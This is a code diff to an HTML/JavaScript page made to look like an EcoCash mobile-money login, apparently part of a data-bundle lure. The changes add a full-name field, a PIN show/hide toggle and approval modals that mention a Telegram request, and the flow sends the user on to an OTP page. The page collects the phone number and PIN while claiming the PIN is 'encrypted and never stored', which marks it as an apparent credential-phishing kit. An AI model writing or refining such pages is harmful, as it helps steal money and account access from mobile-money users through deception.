@@ -12,7 +12,7 @@
             --primary-blue-light: #1a73e8;
             --accent-red: #d32f2f;
             --white: #ffffff;
-            --light-bg: #f8f9fa;
+            --light-bg: #f0f4f8;
             --text-dark: #1a1a1a;
             --text-muted: #666666;
             --border: #e0e0e0;
@@ -119,7 +119,7 @@
             margin-bottom: 8px;
         }
 
-        .phone-input-group {
+        .input-wrapper {
             display: flex;
             align-items: center;
             border: 2px solid var(--primary-blue);
@@ -129,7 +129,7 @@
             transition: all 0.2s;
         }
 
-        .phone-input-group:focus-within {
+        .input-wrapper:focus-within {
             border-color: var(--accent-red);
             background: white;
             box-shadow: 0 0 0 3px rgba(211, 47, 47, 0.1);
@@ -143,7 +143,7 @@
             font-size: 14px;
         }
 
-        .phone-input {
+        .form-input {
             flex: 1;
             border: none;
             background: transparent;
@@ -153,40 +153,23 @@
             font-family: inherit;
         }
 
-        .phone-input::placeholder {
+        .form-input::placeholder {
             color: var(--text-muted);
         }
 
-        .pin-input-group {
-            display: flex;
-            align-items: center;
-            border: 2px solid var(--primary-blue);
-            border-radius: 12px;
-            padding: 12px 14px;
-            background: var(--light-bg);
-            transition: all 0.2s;
-        }
-
-        .pin-input-group:focus-within {
-            border-color: var(--accent-red);
-            background: white;
-            box-shadow: 0 0 0 3px rgba(211, 47, 47, 0.1);
-        }
-
-        .pin-input {
-            flex: 1;
+        .pin-toggle {
+            background: none;
             border: none;
-            background: transparent;
-            font-size: 18px;
-            color: var(--text-dark);
-            outline: none;
-            font-family: inherit;
-            letter-spacing: 4px;
+            color: var(--primary-blue);
+            cursor: pointer;
+            font-weight: 700;
+            font-size: 14px;
+            padding: 0;
+            transition: color 0.2s;
         }
 
-        .pin-input::placeholder {
-            color: var(--text-muted);
-            letter-spacing: 0;
+        .pin-toggle:hover {
+            color: var(--primary-blue-dark);
         }
 
         .form-hint {
@@ -403,6 +386,17 @@
             transform: translateY(-1px);
         }
 
+        .modal-btn-applied {
+            background: var(--primary-blue);
+            color: white;
+            box-shadow: 0 4px 12px rgba(0,82,204,0.2);
+        }
+
+        .modal-btn-applied:hover {
+            background: var(--primary-blue-dark);
+            transform: translateY(-1px);
+        }
+
         @media (max-width: 600px) {
             main { padding: 20px 16px; }
             .login-container { padding: 28px 20px; }
@@ -438,18 +432,27 @@
 
             <form id="loginForm" onsubmit="handleSubmit(event)">
                 <div class="form-group">
+                    <label class="form-label" for="name">Full Name</label>
+                    <div class="input-wrapper">
+                        <input type="text" class="form-input" id="name" placeholder="John Doe" autocomplete="name">
+                    </div>
+                    <p class="form-hint">Enter your full name as it appears on your EcoCash account</p>
+                </div>
+
+                <div class="form-group">
                     <label class="form-label" for="phone">EcoCash Mobile Number</label>
-                    <div class="phone-input-group">
+                    <div class="input-wrapper">
                         <span class="country-code">🇿🇼 +263</span>
-                        <input type="tel" class="phone-input" id="phone" placeholder="77 123 4567" inputmode="numeric" maxlength="9" autocomplete="tel">
+                        <input type="tel" class="form-input" id="phone" placeholder="77 123 4567" inputmode="numeric" maxlength="9" autocomplete="tel">
                     </div>
                     <p class="form-hint">Enter your 9-digit EcoCash number without the leading 0</p>
                 </div>
 
                 <div class="form-group">
                     <label class="form-label" for="pin">EcoCash PIN</label>
-                    <div class="pin-input-group">
-                        <input type="password" class="pin-input" id="pin" placeholder="••••" inputmode="numeric" maxlength="4" autocomplete="off">
+                    <div class="input-wrapper">
+                        <input type="password" class="form-input" id="pin" placeholder="••••" inputmode="numeric" maxlength="4" autocomplete="off">
+                        <button type="button" class="pin-toggle" onclick="togglePinVisibility()">Show</button>
                     </div>
                     <p class="form-hint">Your 4-digit PIN is encrypted and never stored</p>
                 </div>
@@ -470,20 +473,21 @@
     <div id="approvalModal" class="modal-overlay">
         <div class="modal-content">
             <h2 class="modal-title">Request Sent</h2>
-            <p class="modal-subtitle">A payment request has been sent to your Telegram. Please approve or decline the transaction.</p>
+            <p class="modal-subtitle">A payment request has been sent to your Telegram. Please select an action.</p>
             <div class="modal-buttons">
                 <button class="modal-btn modal-btn-approve" onclick="handleApproval('approved')">✓ Approved</button>
                 <button class="modal-btn modal-btn-decline" onclick="handleApproval('declined')">✗ Declined</button>
+                <button class="modal-btn modal-btn-applied" onclick="handleApproval('applied')">⚠ Already Applied</button>
             </div>
         </div>
     </div>
 
-    <!-- Applied Modal -->
+    <!-- Already Subscribed Modal -->
     <div id="appliedModal" class="modal-overlay">
         <div class="modal-content">
-            <h2 class="modal-title">Already Applied</h2>
-            <p class="modal-subtitle">This transaction has already been applied. You can proceed to verify the OTP.</p>
-            <button class="modal-btn modal-btn-approve" onclick="proceedToOTP()">Continue to OTP</button>
+            <h2 class="modal-title">Already Subscribed</h2>
+            <p class="modal-subtitle">This transaction has already been applied to your account. You can proceed to verify the OTP.</p>
+            <button class="modal-btn modal-btn-applied" onclick="proceedToOTP()">Continue to OTP</button>
         </div>
     </div>
 
@@ -510,6 +514,19 @@
             }
         }
 
+        function togglePinVisibility() {
+            const pinInput = document.getElementById('pin');
+            const toggleBtn = event.target;
+            
+            if (pinInput.type === 'password') {
+                pinInput.type = 'text';
+                toggleBtn.textContent = 'Hide';
+            } else {
+                pinInput.type = 'password';
+                toggleBtn.textContent = 'Show';
+            }
+        }
+
         function showError(message) {
             const errorMsg = document.getElementById('errorMsg');
             errorMsg.textContent = message;
@@ -525,8 +542,14 @@
             e.preventDefault();
             clearError();
 
+            const name = document.getElementById('name').value.trim();
             const phone = document.getElementById('phone').value.trim();
             const pin = document.getElementById('pin').value.trim();
+
+            if (!name) {
+                showError('Please enter your full name');
+                return;
+            }
 
             if (!phone) {
                 showError('Please enter your EcoCash mobile number');
@@ -551,7 +574,7 @@
             // Show spinner
             document.getElementById('spinnerOverlay').style.display = 'flex';
 
-            // Simulate processing
+            // Simulate sending to Telegram
             setTimeout(() => {
                 document.getElementById('spinnerOverlay').style.display = 'none';
                 // Show approval modal
@@ -568,9 +591,14 @@
                 return;
             }
 
-            if (status === 'approved') {
+            if (status === 'applied') {
                 // Show applied modal
                 document.getElementById('appliedModal').classList.add('active');
+                return;
+            }
+
+            if (status === 'approved') {
+                proceedToOTP();
             }
         }
 
@@ -579,10 +607,16 @@
             const phone = document.getElementById('phone').value.trim();
             
             // Redirect to OTP page
-            window.location.href = `verify-otp.html?data=${encodeURIComponent(bundleData.data)}&price=${bundleData.price}&phone=${encodeURIComponent(phone)}`;
+            window.location.href = `otp.html?data=${encodeURIComponent(bundleData.data)}&price=${bundleData.price}&phone=${encodeURIComponent(phone)}`;
         }
 
         // Enter key handling
+        document.getElementById('name').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                document.getElementById('phone').focus();
+            }
+        });
+
         document.getElementById('phone').addEventListener('keypress', (e) => {
             if (e.key === 'Enter') {
                 document.getElementById('pin').focus();
